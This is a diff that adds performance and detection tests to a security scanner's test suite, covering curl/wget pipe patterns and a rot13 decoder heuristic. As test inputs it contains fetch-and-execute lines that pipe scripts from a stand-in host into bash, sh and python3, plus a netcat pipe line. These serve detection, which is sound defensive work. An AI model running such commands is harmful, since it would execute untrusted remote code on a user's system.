@@ -96,6 +96,24 @@ describe('dt15 perf: line regexes stay linear on 100 KB runs', () => {
     expect(rs008('mkfifo p; cat p | shasum | nc h 1')).toBe(false);
   });
 
+  it('curl/wget-pipe patterns on a space run and on thousands of download words', () => {
+    const cp = (line: string) => scanWithPatterns(line).filter(m => m.category === 'curl-pipe').map(m => m.pattern);
+    expect(timed(() => cp(`curl${' '.repeat(100_000)}x`))).toBeLessThan(1000);
+    expect(timed(() => cp('curl '.repeat(20_000)))).toBeLessThan(1000);
+    expect(timed(() => cp(`${'wget '.repeat(20_000)}| x`))).toBeLessThan(1000);
+    expect(cp('curl curl -fsSL https://x.test/i.sh | sudo -E bash')).toContain('CP-001');
+    expect(cp('wget -qO- https://x.test/i.sh | sh')).toContain('CP-002');
+    expect(cp('curl a | jq . ; wget -qO- https://x.test/i.py | python3 -')).toContain('CP-003');
+    expect(cp('curl -s https://x.test/f | shasum')).toEqual([]);
+  });
+
+  it('rot13 decoder test on a long space run', async () => {
+    const { analyzeStringTable } = await import('../mcp/string-table.js');
+    expect(timed(() => analyzeStringTable(`charCodeAt(${' '.repeat(100_000)}`))).toBeLessThan(1000);
+    expect(analyzeStringTable('s.charCodeAt( 0 ) + 13').decoderLabels).toContain('rot13');
+    expect(analyzeStringTable('s.charCodeAt() + 13').decoderLabels).toContain('rot13');
+  });
+
   it('getattr(os, …) rewriting on a long space run', () => {
     expect(timed(() => analyzePythonDataFlow(`import os\ngetattr(os,${' '.repeat(100_000)}\n`))).toBeLessThan(1000);
     expect(timed(() => analyzePythonDataFlow(`import os\n${'getattr(os,'.repeat(10_000)}\n`))).toBeLessThan(1000);
